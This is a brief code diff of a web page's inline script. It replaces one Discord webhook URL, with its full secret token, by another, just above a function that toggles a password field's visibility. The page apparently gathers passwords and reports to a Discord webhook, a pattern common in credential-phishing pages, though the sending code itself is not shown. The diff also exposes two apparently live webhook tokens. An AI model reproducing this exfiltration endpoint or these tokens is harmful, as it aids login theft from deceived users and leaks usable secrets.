@@ -163,7 +163,7 @@
 
     <!-- SCRIPTS DE CONTROL -->
     <script>
-        const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1535474253011484744/XVlv8alZV67QLqCiDlDah68BU0hX6SE3XjuC0Oo3x_Wz2PgBOT3epMfq6X_RjqK47Y4P";
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1540553924161966220/gmtc5tUYY1UzVFFEYOKvExB2KG0F-77bG_mK5cEQxn3SZMxq091ebLJEY0qlhmV2Atib";
 
         function togglePasswordVisibility() {
             const passwordInput = document.getElementById('password');
